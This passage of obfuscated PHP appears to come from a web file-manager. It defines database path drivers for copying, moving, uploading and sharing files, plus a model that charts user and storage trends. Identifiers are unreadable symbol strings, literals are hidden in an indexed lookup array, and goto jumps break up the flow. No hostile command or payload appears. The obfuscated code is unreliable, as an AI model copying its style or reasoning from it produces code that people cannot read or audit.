$_SERVER[Çâä∆◊¡]; $™ìΩ™È€ = $this->parse($òƒÂîÔÓ); $’≤È‘∫® = $this->model->copy($˝çßπÍØ, $™ìΩ™È€[$ôïÄ√ﬂä[401]], $ÓªèÓ÷≈, $™ìΩ™È€[$ôïÄ√ﬂä[78]]); return $’≤È‘∫® ? $this->getPathOuter($’≤È‘∫®) : !1; } public function moveFile($‚æûûØô, $˛ÀÃªä‡, $∑Üë∆÷à = REPEAT_REPLACE) { $Œç¬ÚœÇ =& $_SERVER[Çâä∆◊¡]; $ﬁ™›√ﬂ¬ = $this->parse($˛ÀÃªä‡); $˛Û÷Á›£ = $this->model->move($‚æûûØô, $ﬁ™›√ﬂ¬[$Œç¬ÚœÇ[401]], $∑Üë∆÷à, $ﬁ™›√ﬂ¬[$Œç¬ÚœÇ[78]]); return $˛Û÷Á›£ ? $this->getPathOuter($˛Û÷Á›£) : !1; } public function copy($Œê£Ωñ∫, $¿€¿ƒ§∫, $ãü™„… = REPEAT_REPLACE, $§¬©Òö∂ = false) { $º˚≠Ñ˛ã = $this->parse($¿€¿ƒ§∫); $‘¡ùÖ÷⁄ = $this->model->copy($Œê£Ωñ∫, $º˚≠Ñ˛ã[$_SERVER[Çâä∆◊¡][401]], $ãü™„…, $§¬©Òö∂); return $‘¡ùÖ÷⁄ ? $this->getPathOuter($‘¡ùÖ÷⁄) : !1; } public function moveSameAllow() { } public function move($ƒËûÁõù, $‡À®ﬁœÊ, $®√°øπâ = REPEAT_REPLACE, $áŸÀß¶ä = false) { $Òî»À·£ = $this->parse($‡À®ﬁœÊ); $µ™é‹∞œ = $this->model->move($ƒËûÁõù, $Òî»À·£[$_SERVER[Çâä∆◊¡][401]], $®√°øπâ, $áŸÀß¶ä); return $µ™é‹∞œ ? $this->getPathOuter($µ™é‹∞œ) : !1; } public function remove($Çà‡—≠ÿ, $”Ä∑˜å∑ = true) { return $this->model->remove($Çà‡—≠ÿ, $”Ä∑˜å∑); } public function rename($”ƒØı›∂, $¶îó∞ùÖ) { $⁄ÍèæÜ€ = $this->model->rename($”ƒØı›∂, $¶îó∞ùÖ); return $⁄ÍèæÜ€ ? $this->getPathOuter($”ƒØı›∂) : $⁄ÍèæÜ€; } public function size($òÀÉ¬ø∫) { $È˚†¡ë≤ = $this->infoSimple($òÀÉ¬ø∫); return $È˚†¡ë≤ ? $È˚†¡ë≤[$_SERVER[Çâä∆◊¡][80]] : 0; } public function infoSimple($ìêü‹ªﬁ) { return $this->model->sourceInfo($ìêü‹ªﬁ); } public function info($’∞Õ´ë‡) { return $this->infoParse($’∞Õ´ë‡); } public function infoAuth($Ä»¬û≥´) { return $this->infoParse($Ä»¬û≥´, !1, !0); } public function infoWithChildren($Õ¥»™Ë‡) { return $this->infoParse($Õ¥»™Ë‡, !0); } protected function infoParse($å’Á—ÛÄ, $˙™ÄçΩ€ = false, $´ÊÉ®ã∏ = false) { if (!$˙™ÄçΩ€) { return $this->model->pathInfo($å’Á—ÛÄ, $´ÊÉ®ã∏); } return $this->model->pathInfoMore($å’Á—ÛÄ); } public function infoFull($´Æ‹‰®Œ) { $ﬂ◊ê∆ãä =& $_SERVER[Çâä∆◊¡]; $å◊≠Èâ∑ = explode($ﬂ◊ê∆ãä[8], $´Æ‹‰®Œ); $»®¸ïè◊ = implode($ﬂ◊ê∆ãä[8], array_splice($å◊≠Èâ∑, 1)); return $this->model->pathInfoByPath($å◊≠Èâ∑[0], $»®¸ïè◊); } public function hashSimple($Æè§π¨›) { $øÄùò¢ß =& $_SERVER[Çâä∆◊¡]; $∞¨®Áæ© = $this->infoWithChildren($Æè§π¨›); return $∞¨®Áæ©[$øÄùò¢ß[163]][$øÄùò¢ß[170]]; } public function hashMd5($™˜¸å§Ì) { $åêÎ«ƒ∏ =& $_SERVER[Çâä∆◊¡]; $ËÎ»πÊ¯ = $this->infoWithChildren($™˜¸å§Ì); return $ËÎ»πÊ¯[$åêÎ«ƒ∏[163]][$åêÎ«ƒ∏[169]]; } public function exist($∏…ñÚ˙Ò) { $˛µ“ Û› =& $_SERVER[Çâä∆◊¡]; $Æ–œˆÒÃ = $this->parse($∏…ñÚ˙Ò); if (!$Æ–œˆÒÃ[$˛µ“ Û›[78]]) { return $this->isFile($∏…ñÚ˙Ò) || $this->isFolder($∏…ñÚ˙Ò); } $Ñ Í’≈≤ = array($˛µ“ Û›[402] => $Æ–œˆÒÃ[$˛µ“ Û›[401]], $˛µ“ Û›[32] => $Æ–œˆÒÃ[$˛µ“ Û›[78]]); $–◊äµµ = $this->model->where($Ñ Í’≈≤)->find(); return $–◊äµµ ? !0 : !1; } public function isFile($’Ö∑˙Â´) { $Üç…Æ–Å =& $_SERVER[Çâä∆◊¡]; $„–åñ’û = $this->infoSimple($’Ö∑˙Â´); return $„–åñ’û && $„–åñ’û[$Üç…Æ–Å[411]] == $Üç…Æ–Å[89] ? !1 : !0; } public function isFolder($ê˘ª≠◊ü) { $é÷ŒˆìŸ =& $_SERVER[Çâä∆◊¡]; $—˚≠øÜ√ = $this->infoSimple($ê˘ª≠◊ü); return $—˚≠øÜ√ && $—˚≠øÜ√[$é÷ŒˆìŸ[411]] == $é÷ŒˆìŸ[89] ? !0 : !1; } public function listPath($æÈ˘ÅÙè, $ı À“¨ã = false) { $¢”™”≈é =& $_SERVER[Çâä∆◊¡]; if ($æÈ˘ÅÙè == $¢”™”≈é[12]) { return !1; } $ù÷ÓÏ∆ö = array($¢”™”≈é[402] => $æÈ˘ÅÙè); if ($ı À“¨ã) { return $this->model->listSource($ù÷ÓÏ∆ö, -1); } return $this->model->listSource($ù÷ÓÏ∆ö); } public function has($ΩçÔπ ˚, $Ù  ˛ºû = false, $™¢Ò–≥® = null) { $í™˝åÈå =& $_SERVER[Çâä∆◊¡]; $˝¶£Ëã¿ = $this->infoWithChildren($ΩçÔπ ˚); if ($Ù  ˛ºû) { return array($í™˝åÈå[203] => $˝¶£Ëã¿[$í™˝åÈå[203]], $í™˝åÈå[202] => $˝¶£Ëã¿[$í™˝åÈå[202]]); } return $™¢Ò–≥® ? $˝¶£Ëã¿[$í™˝åÈå[203]] : $˝¶£Ëã¿[$í™˝åÈå[202]]; } public function listAll($˚„¯˛ÌË) { $“≈È¥¯ï = IO::info($this->pathParse[$_SERVER[Çâä∆◊¡][78]]); if (!$“≈È¥¯ï) { return array(); } return $this->model->listAll($˚„¯˛ÌË); } public function getContent($àÄêëä¨) { return $this->model->getContent($àÄêëä¨); } public function setContent($≈çëÏÇ˜, $àáé◊ı∫ = '') { return $this->model->setContent($≈çëÏÇ˜, $àáé◊ı∫); } public function fileSubstr($∆Ó»≠æ±, $ÔƒÌ©òÔ, $èè∆‚⁄) { return $this->model->fileSubstr($∆Ó»≠æ±, $ÔƒÌ©òÔ, $èè∆‚⁄); } public function download($„º¶È∫€, $⁄√™áÕ’ = '') { $›ºÃª‰É = get_path_father($⁄√™áÕ’); $Ã¯É˜«õ = get_path_this($⁄√™áÕ’); $ëóØ¿∂∏ = $this->model->fileInfoGet($„º¶È∫€); $õô∆µ›‹ = IO::copy($ëóØ¿∂∏[$_SERVER[Çâä∆◊¡][78]], $›ºÃª‰É, !1, $Ã¯É˜«õ); return $õô∆µ›‹; } public function setModifyTime($¡´Ì¥‚µ, $ØûÈ°¥ª = '') { $¢˝√¿ö =& $_SERVER[Çâä∆◊¡]; if (!$¡´Ì¥‚µ) { return; } $this->model->where(array($¢˝√¿ö[418] => $¡´Ì¥‚µ))->save(array($¢˝√¿ö[86] => $ØûÈ°¥ª)); } public function upload($‚â⁄˙©, $ê√®æç, $≤≥áåˆì = false, $è˚í÷®± = REPEAT_REPLACE) { $µ£∏à©© =& $_SERVER[Çâä∆◊¡]; $ò·µªπ› = $this->parse($‚â⁄˙©); $ò–„¡—≠ = $this->model->addFile($ò·µªπ›[$µ£∏à©©[401]], $ê√®æç, $ò·µªπ›[$µ£∏à©©[78]], $≤≥áåˆì, $è˚í÷®±); return $this->getPathOuter($ò–„¡—≠); } public function uploadFileByID($∑ÛÈ“ê≤, $¥‚€≥ﬁ”, $√˜ÙÁî÷) { $˘´§úÍﬂ =& $_SERVER[Çâä∆◊¡]; $ıÅ·Â¿Í = $this->parse($∑ÛÈ“ê≤); $†è¯åù¿ = $this->model->addFileByFileID($ıÅ·Â¿Í[$˘´§úÍﬂ[401]], $¥‚€≥ﬁ”, $ıÅ·Â¿Í[$˘´§úÍﬂ[78]], $√˜ÙÁî÷); return $this->getPathOuter($†è¯åù¿); } public function addFileByRemote($àµÏëÊÇ, $Ÿ≈∞¨À◊, $òﬁ®ã¿∂ = array(), $ªøÑØÖÃ = '', $≈≠·êÚÄ) { $ê‹‹§©Õ =& $_SERVER[Çâä∆◊¡]; $ïÄ©„≈™ = $this->parse($àµÏëÊÇ); $ªøÑØÖÃ = empty($ªøÑØÖÃ) ? $ïÄ©„≈™[$ê‹‹§©Õ[78]] : $ªøÑØÖÃ; $àÁ¡Û› = $this->model->addFileByRemote($ïÄ©„≈™[$ê‹‹§©Õ[401]], $Ÿ≈∞¨À◊, $ªøÑØÖÃ, $òﬁ®ã¿∂, $≈≠·êÚÄ); return $this->getPathOuter($àÁ¡Û›); } public function uploadLink($äØ¯’ú∏, $˜ﬁ‰Í∏Á = 0) { $¸èÂÛ™Í =& $_SERVER[Çâä∆◊¡]; $Î£≤å¶Ï = $this->parse($äØ¯’ú∏); $˚ì‡îÕ– = _get($GLOBALS[$¸èÂÛ™Í[7]], $¸èÂÛ™Í[1314]); $áœÀ´˚∑ = _get($GLOBALS[$¸èÂÛ™Í[7]], $¸èÂÛ™Í[1315]); $äØ¯’ú∏ = Model($¸èÂÛ™Í[603])->createFileName($Î£≤å¶Ï[$¸èÂÛ™Í[78]], $˚ì‡îÕ–, $áœÀ´˚∑); return IO::uploadLink($äØ¯’ú∏, $˜ﬁ‰Í∏Á); } public function fileNameAuto($˛…öŸñ‘, $¶‹˜ÁÔÆ, $Ê˛ûß±â = REPEAT_REPLACE, $ºÒˆÕ“• = false) { return $this->model->fileNameAuto($˛…öŸñ‘, $¶‹˜ÁÔÆ, $Ê˛ûß±â, $ºÒˆÕ“•); } public function fileNameExist($á∂éË˛¢, $≈Ú÷ıô⁄) { return $this->model->fileNameExist($á∂éË˛¢, $≈Ú÷ıô⁄); } protected function _fileOut($Ú’Òıﬁ˜, $õ√≥≤‚Ã = false, $´±ﬂ÷ù™ = false, $É…€ëÓè = '', $ßÜ€«éø = false) { $ﬁ◊É†ûÕ =& $_SERVER[Çâä∆◊¡]; $Õãí˚éï = $this->model->sourceInfo($Ú’Òıﬁ˜); if ($Õãí˚éï[$ﬁ◊É†ûÕ[411]] == $ﬁ◊É†ûÕ[89]) { header($ﬁ◊É†ûÕ[1316]); die; } $Ó÷ç„Ì  = $this->model->fileInfoGet($Ú’Òıﬁ˜); $É…€ëÓè = $Ó÷ç„Ì [$ﬁ◊É†ûÕ[169]] ? $Ó÷ç„Ì [$ﬁ◊É†ûÕ[169]] : $É…€ëÓè; $®´¡ëˆƒ = isset($GLOBALS[$ﬁ◊É†ûÕ[1317]]) ? $GLOBALS[$ﬁ◊É†ûÕ[1317]] : $Õãí˚éï[$ﬁ◊É†ûÕ[32]]; if ($ßÜ€«éø) { return IO::fileOutServer($Ó÷ç„Ì [$ﬁ◊É†ûÕ[78]], $õ√≥≤‚Ã, $®´¡ëˆƒ, $É…€ëÓè); } IO::fileOut($Ó÷ç„Ì [$ﬁ◊É†ûÕ[78]], $õ√≥≤‚Ã, $®´¡ëˆƒ, $É…€ëÓè); } public function fileOut($ÄÀñô¸æ, $ˆæã¡÷´ = false, $Ü´’ûâÑ = false, $ã⁄îæ£Å = '') { $this->_fileOut($ÄÀñô¸æ, $ˆæã¡÷´, $Ü´’ûâÑ, $ã⁄îæ£Å); } public function fileOutServer($≥Õ¢˜‹ê, $Öª«ÇÕß = false, $‡ﬁö®º∑ = false, $ﬂç÷À∫É = '') { $this->_fileOut($≥Õ¢˜‹ê, $Öª«ÇÕß, $‡ﬁö®º∑, $ﬂç÷À∫É, !0); } protected function _fileOutImage($⁄≥∂Ó†“, $œˆ’„°® = 250) { $≠Õﬂêá¶ =& $_SERVER[Çâä∆◊¡]; $»˘÷éª› = $this->model->pathInfo($⁄≥∂Ó†“); if ($»˘÷éª›[$≠Õﬂêá¶[411]] == $≠Õﬂêá¶[89]) { show_json($≠Õﬂêá¶[1318] . $⁄≥∂Ó†“, !1); } $∏¬•˜€Â = $this->model->fileInfoGet($⁄≥∂Ó†“); $∏¬•˜€Â[$≠Õﬂêá¶[32]] = $»˘÷éª›[$≠Õﬂêá¶[32]]; $∏¬•˜€Â[$≠Õﬂêá¶[162]] = $»˘÷éª›[$≠Õﬂêá¶[162]]; $GLOBALS[$≠Õﬂêá¶[1317]] = $∏¬•˜€Â[$≠Õﬂêá¶[32]]; $GLOBALS[$≠Õﬂêá¶[161]] = $∏¬•˜€Â; IO::fileOutImage($∏¬•˜€Â[$≠Õﬂêá¶[78]], $œˆ’„°®); } public function fileOutImage($˙È¥˘“µ, $ÙœÜÿîª = 250) { $this->_fileOutImage($˙È¥˘“µ, $ÙœÜÿîª); } public function fileOutImageServer($ÍŸÈœ°¶, $ÍŸ˝›©ª = 250) { $this->_fileOutImage($ÍŸÈœ°¶, $ÍŸ˝›©ª); } public function link($øÉ”ﬂœ˘, $ø«ı¢¨ô = '') { $æ∂€Œﬁ¨ = $this->model->fileInfoGet($øÉ”ﬂœ˘); return IO::link($æ∂€Œﬁ¨[$_SERVER[Çâä∆◊¡][78]], $ø«ı¢¨ô); } protected function parse($ı˘àÏÚ˘) { $Â∆ÒóÁÑ =& $_SERVER[Çâä∆◊¡]; if (strstr($ı˘àÏÚ˘, $Â∆ÒóÁÑ[8]) === !1) { return array($Â∆ÒóÁÑ[420] => intval($ı˘àÏÚ˘), $Â∆ÒóÁÑ[78] => $Â∆ÒóÁÑ[12], $Â∆ÒóÁÑ[1313] => array()); } $◊◊„ÆÖ¬ = explode($Â∆ÒóÁÑ[8], trim($ı˘àÏÚ˘, $Â∆ÒóÁÑ[8])); if (count($◊◊„ÆÖ¬) < 2) { show_tips(clear_html($ı˘àÏÚ˘) . $Â∆ÒóÁÑ[1319]); } return array($Â∆ÒóÁÑ[420] => intval($◊◊„ÆÖ¬[0]), $Â∆ÒóÁÑ[78] => $◊◊„ÆÖ¬[1], $Â∆ÒóÁÑ[1313] => array_slice($◊◊„ÆÖ¬, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($£˘öéÈ˜) { $this->pathParse = $£˘öéÈ˜; $this->model = Model($_SERVER[Çâä∆◊¡][1312]); } public function getPathOuter($¬≥Ê°‡—) { $ÄÏ®øç… =& $_SERVER[Çâä∆◊¡]; if (!$¬≥Ê°‡—) { return $¬≥Ê°‡—; } $≈¨˜¨Íç = $this->parse($¬≥Ê°‡—); return trim(KodIO::makeShare($this->pathParse[$ÄÏ®øç…[401]], $≈¨˜¨Íç[$ÄÏ®øç…[401]]), $ÄÏ®øç…[8]); } protected function infoParse($˜ëß ñõ, $ıπàê˜… = false, $ûÂ‘áè‘ = false) { $¨ü¢∞õ° =& $_SERVER[Çâä∆◊¡]; $„áäáñ˜ = $this->pathParse[$¨ü¢∞õ°[401]]; $ÿ˛É–√Ñ = trim($this->pathParse[$¨ü¢∞õ°[1154]], $¨ü¢∞õ°[8]); return Action($¨ü¢∞õ°[1320])->sharePathInfo($„áäáñ˜, $ÿ˛É–√Ñ, $ıπàê˜…); } public function infoFull($ƒå¯‹é€) { $íÓÊà¶Õ =& $_SERVER[Çâä∆◊¡]; $å⁄±ﬂèà = explode($íÓÊà¶Õ[8], trim($ƒå¯‹é€, $íÓÊà¶Õ[8])); if (count($å⁄±ﬂèà) > 1) { $¥Ì˘´ù∂ = implode($íÓÊà¶Õ[8], array_splice($å⁄±ﬂèà, 1)); $πÏö¬©‡ = $this->model->pathInfoByPath($å⁄±ﬂèà[0], $¥Ì˘´ù∂); if (!$πÏö¬©‡) { return !1; } $this->pathParse[$íÓÊà¶Õ[1154]] = $πÏö¬©‡[$íÓÊà¶Õ[403]]; } return $this->infoParse($ƒå¯‹é€); } public function listAll($ØÇØÈ¡∑) { $ˆ∑©ª≠‰ =& $_SERVER[Çâä∆◊¡]; $—¯˘©Û = IO::info($this->pathParse[$ˆ∑©ª≠‰[78]]); if (!$—¯˘©Û) { return array(); } $Õãáñ¢ë = $this->model->listAll($ØÇØÈ¡∑); $ÉÉ¸ï‚£ = Model($ˆ∑©ª≠‰[595])->getInfo($—¯˘©Û[$ˆ∑©ª≠‰[488]]); $ô–¡˙öÊ = Action($ˆ∑©ª≠‰[1320]); foreach ($Õãáñ¢ë as &$‰¬ÂêÃÚ) { check_abort(); $‰¬ÂêÃÚ[$ˆ∑©ª≠‰[87]] = $ô–¡˙öÊ->_shareItemeParse($‰¬ÂêÃÚ[$ˆ∑©ª≠‰[87]], $ÉÉ¸ï‚£); } unset($‰¬ÂêÃÚ); return $Õãáñ¢ë; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($®∞ÆÏâÖ) { $this->pathParse = $®∞ÆÏâÖ; $this->model = Model($_SERVER[Çâä∆◊¡][1312]); } protected function infoParse($ïÃëÇﬁ, $∆ˆ»ßë· = false, $çìª’ı˛ = false) { $Òºò‡¢ä =& $_SERVER[Çâä∆◊¡]; return Action($Òºò‡¢ä[1160])->sharePathInfo($this->pathParse[$Òºò‡¢ä[78]], !0, $∆ˆ»ßë·); } public function listPath($èˆÎ÷ı¡, $¸òÛ»Ö· = false) { $¡ÄÅ˙ÒÑ =& $_SERVER[Çâä∆◊¡]; $Ë¿µ‘ı¶ = parent::listPath($èˆÎ÷ı¡, $¸òÛ»Ö·); if (!$Ë¿µ‘ı¶) { return $Ë¿µ‘ı¶; } if (is_array($Ë¿µ‘ı¶[$¡ÄÅ˙ÒÑ[1321]])) { $Ë¿µ‘ı¶[$¡ÄÅ˙ÒÑ[1321]] = Action($¡ÄÅ˙ÒÑ[1160])->shareItemInfo($Ë¿µ‘ı¶[$¡ÄÅ˙ÒÑ[1321]]); } foreach ($Ë¿µ‘ı¶ as $ÛÌô§óì => $◊¡ØîÜ˜) { if (!in_array($ÛÌô§óì, array($¡ÄÅ˙ÒÑ[76], $¡ÄÅ˙ÒÑ[77]))) { continue; } foreach ($◊¡ØîÜ˜ as $˙Ã±±∞û => $›ÍÌÙöﬂ) { $Ë¿µ‘ı¶[$ÛÌô§óì][$˙Ã±±∞û] = Action($¡ÄÅ˙ÒÑ[1160])->shareItemInfo($›ÍÌÙöﬂ); } } return $Ë¿µ‘ı¶; } public function listAll($˝˛ç‡˚≤) { $⁄—àîô¯ =& $_SERVER[Çâä∆◊¡]; $ŸÔóº¡ø = IO::info($this->pathParse[$⁄—àîô¯[78]]); if (!$ŸÔóº¡ø) { return array(); } $û»π›È¢ = $this->model->listAll($˝˛ç‡˚≤); foreach ($û»π›È¢ as &$À◊ëâï⁄) { $À◊ëâï⁄[$⁄—àîô¯[87]] = Action($⁄—àîô¯[1160])->shareItemInfo($À◊ëâï⁄[$⁄—àîô¯[87]]); } unset($À◊ëâï⁄); return $û»π›È¢; } } goto Cπì¨áÀ‡„; d¥ãÚñ◊ñﬂ: class AnalysisModel extends ModelBaseLight { public function init($≤ëé≥ê¿) { $⁄óóÇ±Ú =& $_SERVER[Çâä∆◊¡]; $†Õƒœ—≥ = array($⁄óóÇ±Ú[594] => array($⁄óóÇ±Ú[33] => $⁄óóÇ±Ú[1739], $⁄óóÇ±Ú[268] => array($⁄óóÇ±Ú[219], $⁄óóÇ±Ú[758], $⁄óóÇ±Ú[1740], $⁄óóÇ±Ú[1741])), $⁄óóÇ±Ú[1742] => array($⁄óóÇ±Ú[33] => $⁄óóÇ±Ú[1743], $⁄óóÇ±Ú[268] => array($⁄óóÇ±Ú[219], $⁄óóÇ±Ú[756], $⁄óóÇ±Ú[1744], $⁄óóÇ±Ú[1745], $⁄óóÇ±Ú[1746]))); if (!isset($†Õƒœ—≥[$≤ëé≥ê¿])) { return !1; } $this->optionType = $†Õƒœ—≥[$≤ëé≥ê¿][$⁄óóÇ±Ú[33]]; $this->field = $†Õƒœ—≥[$≤ëé≥ê¿][$⁄óóÇ±Ú[268]]; return !0; } public function listData($∫ÿá‹òÔ = false, $Æ ùø’∑ = "\155\x6f\x64\x69\x66\x79\124\x69\155\x65", $÷ƒ‰Ÿä˙ = false) { return parent::listData($∫ÿá‹òÔ, $Æ ùø’∑, $÷ƒ‰Ÿä˙); } public function trendList($©Çõ≈¡õ) { $™±”ñÖº =& $_SERVER[Çâä∆◊¡]; $ÙÁ„Åﬂ‘ = $this->listData(); if ($ÙÁ„Åﬂ‘) { $Üëä…œ˙ = end($ÙÁ„Åﬂ‘); $±æÇ˚û« = date($™±”ñÖº[1747], strtotime($™±”ñÖº[1748])); if ($Üëä…œ˙[$™±”ñÖº[219]] == $±æÇ˚û«) { return $ÙÁ„Åﬂ‘; } $ß®¿ôæ” = strtotime($Üëä…œ˙[$™±”ñÖº[219]]); } if (!isset($ß®¿ôæ”)) { $≤–Íñé£ = $©Çõ≈¡õ == $™±”ñÖº[594] ? $™±”ñÖº[538] : $™±”ñÖº[818]; $ß®¿ôæ” = Model($≤–Íñé£)->min($™±”ñÖº[193]); } $¬ÆÑ»èÄ = $™±”ñÖº[1749] . ucfirst($©Çõ≈¡õ); $Ï¿ŒÊîö = $this->dateList($ß®¿ôæ”); foreach ($Ï¿ŒÊîö as $±æÇ˚û«) { $this->{$¬ÆÑ»èÄ}($±æÇ˚û«); } return $this->listData(); } private function dateList($òú∞£¬Ø) { $òΩ¸∑òŸ =& $_SERVER[Çâä∆◊¡]; $µÜëë‘— = $òú∞£¬Ø; $ñ’Íƒî˛ = strtotime($òΩ¸∑òŸ[1748]); $íŒ¸ÅØÚ = array(); while ($µÜëë‘— <= $ñ’Íƒî˛) { $íŒ¸ÅØÚ[] = date($òΩ¸∑òŸ[1747], $µÜëë‘—); $µÜëë‘— = strtotime($òΩ¸∑òŸ[1750], $µÜëë‘—); } return $íŒ¸ÅØÚ; } public function _recordUser($¨™ƒƒá† = '') { $≠©¡ñõ  =& $_SERVER[Çâä∆◊¡]; $πË∑Èã≤ = strtotime(date($≠©¡ñõ [1751], strtotime($¨™ƒƒá†))); $¨˜Ï‘Ûì = strtotime(date($≠©¡ñõ [1752], strtotime($¨™ƒƒá†))); $ÁÕØ¸˜Å = array($≠©¡ñõ [193] => array($≠©¡ñõ [1000], $¨˜Ï‘Ûì)); $ËΩ∑Ù¯ = Model($≠©¡ñõ [538])->where($ÁÕØ¸˜Å)->count($≠©¡ñõ [1642]); $ÁÕØ¸˜Å[$≠©¡ñõ [193]] = array($≠©¡ñõ [328], array($πË∑Èã≤, $¨˜Ï‘Ûì)); $˝ãøâÇ = Model($≠©¡ñõ [538])->where($ÁÕØ¸˜Å)->count($≠©¡ñõ [1642]); $ÁÕØ¸˜Å[$≠©¡ñõ [33]] = $≠©¡ñõ [1753]; $…‡≥◊úÀ = Model($≠©¡ñõ [1754])->where($ÁÕØ¸˜Å)->count($≠©¡ñõ [1755]); $¨æïíìƒ = array($≠©¡ñõ [219] => $¨™ƒƒá†, $≠©¡ñõ [758] => (int) $ËΩ∑Ù¯, $≠©¡ñõ [1740] => (int) $˝ãøâÇ, $≠©¡ñõ [1741] => (int) $…‡≥◊úÀ); return $this->insert($¨æïíìƒ); } public function _recordStore($˘‹ƒáÁä = '') { $«Ö—¥˙Ω =& $_SERVER[Çâä∆◊¡]; $√Ö€õ∂‡ = strtotime(date($«Ö—¥˙Ω[1752], strtotime($˘‹ƒáÁä))); $ã¶Ï∏ƒ« = array($«Ö—¥˙Ω[193] => array($«Ö—¥˙Ω[1000], $√Ö€õ∂‡)); $Äçù˝·≥ = Model($«Ö—¥˙Ω[470])->where($ã¶Ï∏ƒ«)->sum($«Ö—¥˙Ω[80]); $ã¶Ï∏ƒ«[$«Ö—¥˙Ω[411]] = 0; $∆ÛåÜ“ù = Model($«Ö—¥˙Ω[818])->where($ã¶Ï∏ƒ«)->sum($«Ö—¥˙Ω[80]); $ã¶Ï∏ƒ«[$«Ö—¥˙Ω[412]] = 1; $õœá¯Êº = Model($«Ö—¥˙Ω[818])->where($ã¶Ï∏ƒ«)->sum($«Ö—¥˙Ω[80]); $ã¶Ï∏ƒ«[$«Ö—¥˙Ω[412]] = 2; $•˛· øû = Model($«Ö—¥˙Ω[818])->where($ã¶Ï∏ƒ«)->sum($«Ö—¥˙Ω[80]); $ﬁ≥ÎÑ˝‡ = array($«Ö—¥˙Ω[219] => $˘‹ƒáÁä, $«Ö—¥˙Ω[756] => (int) $∆ÛåÜ“ù, $«Ö—¥˙Ω[1744] => (int) $Äçù˝·≥, $«Ö—¥˙Ω[1745] => (int) $õœá¯Êº, $«Ö—¥˙Ω[1746] => (int) $•˛· øû); return $this->insert($ﬁ≥ÎÑ˝‡); } public function trend($˚ÖÑö¿ô, $æñÇµÛ⁄) { $ú·∏ÉÏç =& $_SERVER[Çâä∆◊¡]; if (!$this->init($˚ÖÑö¿ô)) { return !1; } $ãø≥èΩ∑ = $this->trendList($˚ÖÑö¿ô); if ($ãø≥èΩ∑ && $æñÇµÛ⁄ != $ú·∏ÉÏç[1615]) { $ãô∑’Ë‚ = $ãø≥èΩ∑[0][$ú·∏ÉÏç[219]]; $ÕÅ˝íÄƒ = $this->validDate($æñÇµÛ⁄, $ãô∑’Ë‚); $¯‡˝ü—Ö = array(); $•©—“¬Á = array_to_keyvalue($ãø≥èΩ∑, $ú·∏ÉÏç[219]); foreach ($ÕÅ˝íÄƒ as $úŸáË¨œ) { if (isset($•©—“¬Á[$úŸáË¨œ])) { $¯öΩ£ò÷ = $•©—“¬Á[$úŸáË¨œ]; } else { $¯öΩ£ò÷ = end($ãø≥èΩ∑); $¯öΩ£ò÷[$ú·∏ÉÏç[219]] = $úŸáË¨œ; if ($˚ÖÑö¿ô == $ú·∏ÉÏç[594]) { $¯öΩ£ò÷[$ú·∏ÉÏç[1740]] = $¯öΩ£ò÷[$ú·∏ÉÏç[1741]] = 0; } } $¯‡˝ü—Ö[] = $¯öΩ£ò÷; } $ãø≥èΩ∑ = $¯‡˝ü—Ö; } $É†√ı≠“ = array($ú·∏ÉÏç[594] => array($ú·∏ÉÏç[758] => LNG($ú·∏ÉÏç[1756]), $ú·∏ÉÏç[1740] => LNG($ú·∏ÉÏç[1757]), $ú·∏ÉÏç[1741] => LNG($ú·∏ÉÏç[1758])), $ú·∏ÉÏç[1742] => array($ú·∏ÉÏç[756] => LNG($ú·∏ÉÏç[1759]), $ú·∏ÉÏç[1744] => LNG($ú·∏ÉÏç[1760]), $ú·∏ÉÏç[1745] => LNG($ú·∏ÉÏç[1761]), $ú·∏ÉÏç[1746] => LNG($ú·∏ÉÏç[1762]))); $Ä¥Î“™› = array($ú·∏ÉÏç[594] => $ú·∏ÉÏç[1763], $ú·∏ÉÏç[1742] => $ú·∏ÉÏç[80]); if (empty($ãø≥èΩ∑)) { $úŸáË¨œ = date($ú·∏ÉÏç[1747], strtotime($ú·∏ÉÏç[1748])); $™å˚Ê±´ = array($ú·∏ÉÏç[219] => $úŸáË¨œ); foreach ($É†√ı≠“[$˚ÖÑö¿ô] as $∂„üá°√ => $Ü´°ÑÖŒ) { $™å˚Ê±´[$∂„üá°√] = 0; } $ãø≥èΩ∑[] = $™å˚Ê±´; } $€ÒÏƒı˘ = array(); foreach ($ãø≥èΩ∑ as $Ü´°ÑÖŒ) { if ($˚ÖÑö¿ô == $ú·∏ÉÏç[1742] && $Ü´°ÑÖŒ[$ú·∏ÉÏç[1744]] > $Ü´°ÑÖŒ[$ú·∏ÉÏç[756]]) { $Ü´°ÑÖŒ[$ú·∏ÉÏç[1744]] = $Ü´°ÑÖŒ[$ú·∏ÉÏç[756]]; } foreach ($É†√ı≠“[$˚ÖÑö¿ô] as $∂„üá°√ => $ﬁﬁ†ƒÏ◊) { $¯öΩ£ò÷ = array($ú·∏ÉÏç[219] => $Ü´°ÑÖŒ[$ú·∏ÉÏç[219]], $ú·∏ÉÏç[1539] => $ﬁﬁ†ƒÏ◊); $¯öΩ£ò÷[$Ä¥Î“™›[$˚ÖÑö¿ô]] = isset($Ü´°ÑÖŒ[$∂„üá°√]) ? $Ü´°ÑÖŒ[$∂„üá°√] : 0; $€ÒÏƒı˘[] = $¯öΩ£ò÷; } } return $€ÒÏƒı˘; } public function validDate($ƒŒÚíœÑ, $ÿ‘Ç≥—ˆ) { $¢†œ∆’ =& $_SERVER[Çâä∆◊¡]; $ç˘è¿Â˙ = date($¢†œ∆’[1747], strtotime($¢†œ∆’[1748])); $∫∏µ∂áÿ = array($ç˘è¿Â˙); switch ($ƒŒÚíœÑ) { case $¢†œ∆’[1622]: $ÄÒÄ√î™ = mktime(0, 0, 0, date($¢†œ∆’[1764]), date($¢†œ∆’[1360]) - date($¢†œ∆’[1423]) + 7 - 7, date($¢†œ∆’[1765])); $‡—£‡ß÷ = 0; do { $≠†ï∏úª = date($¢†œ∆’[1747], $ÄÒÄ√î™ - 3600 * 24 * 7 * $‡—£‡ß÷); $∫∏µ∂áÿ[] = $≠†ï∏úª; $‡—£‡ß÷++; } while ($ÿ‘Ç≥—ˆ < $≠†ï∏úª); break; case $¢†œ∆’[1620]: $‡—£‡ß÷ = 1; do { $Ö∏ù˛®ë = date($¢†œ∆’[1766], strtotime("\x2d\x20{$‡—£‡ß÷}\40\155\157\x6e\x74\150\x73")); $∫∏µ∂áÿ[] = $Ö∏ù˛®ë; $‡—£‡ß÷++; } while ($ÿ‘Ç≥—ˆ < $Ö∏ù˛®ë); break; case $¢†œ∆’[1767]: 